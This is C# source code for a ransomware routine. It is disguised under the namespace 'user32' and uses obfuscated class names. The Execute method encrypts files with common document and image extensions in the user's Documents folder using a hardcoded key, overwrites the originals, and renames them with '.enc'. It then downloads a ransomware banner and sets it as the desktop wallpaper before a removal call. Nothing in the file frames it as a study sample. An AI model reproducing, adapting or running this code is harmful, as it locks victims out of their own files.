using System;
using System.CodeDom;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using static user32.adsjah;
using static user32.jhkasd;

namespace user32
{
    public class ufahef
    {
        private static byte[] GetKey() {
            string k = "dGgxNV9Jc183aDNfa0V5X2xtNDBfWERfOTlfMTMzNyE=";
            return RevertStr(k);
        }
        public static void Execute()
        {
            string d = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string[] arr = Directory.GetFiles(d);
            foreach (string p in arr)
            {
                if (CheckExt(p))
                {
                    byte[] key = GetKey();
                    byte[] b = File.ReadAllBytes(p);
                    byte[] iv = StringToByteArray(GenIV(32));
                    byte[] e = Encrypt(b, key, iv);
                    byte[] data = new byte[iv.Length + e.Length];
                    System.Buffer.BlockCopy(iv, 0, data, 0, iv.Length);
                    System.Buffer.BlockCopy(e, 0, data, iv.Length, e.Length);
                    string o = ConvertStr(data);
                    using (StreamWriter ef = new StreamWriter(p, false))
                    {
                        ef.Write(o);
                    }
                    FileInfo fext = new FileInfo(p);
                    string extn = fext.Extension;
                    File.Move(p, Path.ChangeExtension(p, extn+".enc"));
                }
            }
            Noti();
            Remove();
        }

        private const int SPI_SETDESKWALLPAPER = 20;
        private const int SPIF_UPDATEINIFILE = 1;
        private const int SPIF_SENDCHANGE = 2;

        [DllImport("C:\\Windows\\System32\\user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        private static void Noti()
        {
            using (var client = new WebClient())
            {
                string url = "https://www.shutterstock.com/image-vector/web-banner-vector-illustration-ransomware-600w-1202853070.jpg";
                string path = Directory.GetCurrentDirectory();
                client.DownloadFile(url, path+"a.png");
                SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path+"a.png", SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
            }
        }

        private static bool CheckExt(string p)
        {
            string[] valid = {".txt", ".docx", ".pptx", ".xlsx", ".pdf", ".xml", ".doc", ".png", ".jpg", ".jpeg", ".bmp", ".cfg"};
            FileInfo fext = new FileInfo(p);
            string extn = fext.Extension;
            return valid.Contains(extn);
        }
    }
}
